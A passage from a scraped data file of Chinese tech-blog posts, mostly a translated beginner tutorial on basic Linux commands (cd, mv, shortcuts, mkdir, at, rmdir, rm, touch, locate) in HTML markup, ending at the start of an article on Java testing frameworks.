不会识别它，并会报告你正在查找的文件夹不存在（LCTT 译注：这是因为目录名中有空格）。要跳转到那个文件夹，你需要包含一个反斜杠。改命令如下所示：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93103da6803560764\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd Gym\\ Playlist\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93103da6803560764-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93103da6803560764-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93103da6803560764-1\"><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">Gym</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Playlist</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93103da6803560764-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>要从当前文件夹返回到上一个文件夹，你可以在该文件夹输入 <code>cd ..</code>。把这两个点想象成一个后退按钮。</p>\n<h3 id=\"toc_3\">3、 mv</h3>\n<p>该命令将文件从一个文件夹转移到另一个文件夹；<code>mv</code> 代表“移动”。你可以使用这个简单的命令，就像你把一个文件拖到 PC 上的一个文件夹一样。</p>\n<p>例如，如果我想创建一个名为 <code>testfile</code> 的文件来演示所有基本的 Linux 命令，并且我想将它移动到我的 <code>Documents</code> 文件夹中，我将输入这个命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93103dab133526039\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmv /home/sam/testfile /home/sam/Documents/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93103dab133526039-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93103dab133526039-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93103dab133526039-1\"><span class=\"crayon-v\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sam</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">testfile</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sam</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Documents</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93103dab133526039-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>命令的第一部分（<code>mv</code>）说我想移动一个文件，第二部分（<code>home/sam/testfile</code>）表示我想移动的文件，第三部分（<code>/home/sam/Documents/</code>）表示我希望传输文件的位置。</p>\n<h3 id=\"toc_4\">4、 快捷键</h3>\n<p>好吧，这不止一个命令，但我忍不住把它们都包括进来。为什么？因为它们能节省时间并避免经历头痛。</p>\n<ul>\n<li><code>CTRL+K</code> 从光标处剪切文本直至本行结束</li>\n<li><code>CTRL+Y</code> 粘贴文本</li>\n<li><code>CTRL+E</code> 将光标移到本行的末尾</li>\n<li><code>CTRL+A</code> 将光标移动到本行的开头</li>\n<li><code>ALT+F</code> 跳转到下一个空格处</li>\n<li><code>ALT+B</code> 回到前一个空格处</li>\n<li><code>ALT+Backspace</code> 删除前一个词</li>\n<li><code>CTRL+W</code> 剪切光标前一个词</li>\n<li><code>Shift+Insert</code> 将文本粘贴到终端中</li>\n<li><code>Ctrl+D</code> 注销</li>\n</ul>\n<p>这些命令在许多方面都能派上用场。例如，假设你在命令行文本中拼错了一个单词：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93103daf068696800\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt-get intall programname\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93103daf068696800-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93103daf068696800-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93103daf068696800-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">intall </span><span class=\"crayon-i\">programname</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93103daf068696800-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>你可能注意到 <code>install</code> 拼写错了，因此该命令无法工作。但是快捷键可以让你很容易回去修复它。如果我的光标在这一行的末尾，我可以按下两次 <code>ALT+B</code> 来将光标移动到下面用 <code>^</code> 符号标记的地方：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93103db2190828249\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt-get^intall programname\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93103db2190828249-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93103db2190828249-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93103db2190828249-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">get</span><span class=\"crayon-o\">^</span><span class=\"crayon-e\">intall </span><span class=\"crayon-i\">programname</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93103db2190828249-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>现在，我们可以快速地添加字母 <code>s</code> 来修复 <code>install</code>，十分简单！</p>\n<h3 id=\"toc_5\">5、 mkdir</h3>\n<p>这是你用来在 Linux 环境下创建目录或文件夹的命令。例如，如果你像我一样喜欢 DIY，你可以输入 <code>mkdir DIY</code> 为你的 DIY 项目创建一个目录。</p>\n<h3 id=\"toc_6\">6、 at</h3>\n<p>如果你想在特定时间运行 Linux 命令，你可以将 <code>at</code> 添加到语句中。语法是 <code>at</code> 后面跟着你希望命令运行的日期和时间，然后命令提示符变为 <code>at&gt;</code>，这样你就可以输入在上面指定的时间运行的命令。</p>\n<p>例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93103db6761779303\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nat 4:08 PM Sat\r\nat&gt; cowsay 'hello'\r\nat&gt; CTRL+D\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93103db6761779303-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93103db6761779303-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93103db6761779303-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93103db6761779303-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93103db6761779303-1\"><span class=\"crayon-i\">at</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">08</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PM </span><span class=\"crayon-e\">Sat</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93103db6761779303-2\"><span class=\"crayon-v\">at</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cowsay</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'hello'</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93103db6761779303-3\"><span class=\"crayon-v\">at</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CTRL</span><span class=\"crayon-o\">+</span><span class=\"crayon-i\">D</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93103db6761779303-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这将会在周六下午 4:08 运行 <code>cowsay</code> 程序。</p>\n<h3 id=\"toc_7\">7、 rmdir</h3>\n<p>这个命令允许你通过 Linux CLI 删除一个目录。例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93103db9757540133\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nrmdir testdirectory\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93103db9757540133-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93103db9757540133-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93103db9757540133-1\"><span class=\"crayon-e\">rmdir </span><span class=\"crayon-i\">testdirectory</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93103db9757540133-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>请记住，这个命令不会删除里面有文件的目录。这只在删除空目录时才起作用。</p>\n<h3 id=\"toc_8\">8、 rm</h3>\n<p>如果你想删除文件，<code>rm</code> 命令就是你想要的。它可以删除文件和目录。要删除一个文件，键入 <code>rm testfile</code>，或者删除一个目录和里面的文件，键入 <code>rm -r</code>。</p>\n<h3 id=\"toc_9\">9、 touch</h3>\n<p><code>touch</code> 命令，也就是所谓的 “make file 的命令”，允许你使用 Linux CLI 创建新的、空的文件。很像 <code>mkdir</code> 创建目录，<code>touch</code> 会创建文件。例如，<code>touch testfile</code> 将会创建一个名为 testfile 的空文件。</p>\n<h3 id=\"toc_10\">10、 locate</h3>\n<p>这个命令是你在 Linux 系统中用来查找文件的命令。就像在 Windows 中搜索一样，如果你忘了存储文件的位置或它的名字，这是非常有用的。</p>\n<p>例如，如果你有一个关于区块链用例的文档，但是你忘了标题，你可以输入 <code>locate -blockchain</code> 或者通过用星号分隔单词来查找 “blockchain use cases”，或者星号（<code>*</code>）。例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93103dbd525993982\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlocate -i*blockchain*use*cases*\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93103dbd525993982-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93103dbd525993982-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93103dbd525993982-1\"><span class=\"crayon-v\">locate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e \">i*</span><span class=\"crayon-e \">blockchain*</span><span class=\"crayon-st\">use</span><span class=\"crayon-o\">*</span><span class=\"crayon-e \">cases*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93103dbd525993982-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>还有很多其他有用的 Linux CLI 命令，比如 <code>pkill</code> 命令，如果你开始关机但是你意识到你并不想这么做，那么这条命令很棒。但是这里描述的 10 个简单而有用的命令是你开始使用 Linux 命令行所需的基本知识。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113942\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113942votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113942\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/113942/", "url_obj_id": "5e2d42904ac3f58401f4bcdd5d04bac1"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/58175e1df62779046a3a4e2483575937.jpg"], "title": "JAVA 程序员需要用到 10 个测试框架和库", "create_date": "2018/05/14 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/wx1615593136\">搬砖大师傅</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://dzone.com/articles/10-essential-testing-tools-for-java-developers\">Javin Paul  </a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><div>\n<blockquote><p>想要提高你的自动化测试技术？以下是 10 个优秀的测试框架和库，以及它们常见用法的概述。</p></blockquote>\n<p>最近我写了一些文章，关于 Java 程序员今年应该学习什么，例如编程语言，库和框架等，如果只能学习或提高其中一项，那必然是自动化测试技能。</p>\n<p>测试是专业程序员区别于业余程序员的一项指标，作为专业程序员，并非必须采用 TDD，BDD 或其它测试方法论，但最低标准是通过编写代码的方式，来自动化测试自己的代码。</p>\n<p>许多 Java 程序员编写单元测试和集成测试，使用 Jenkins、TeamCity 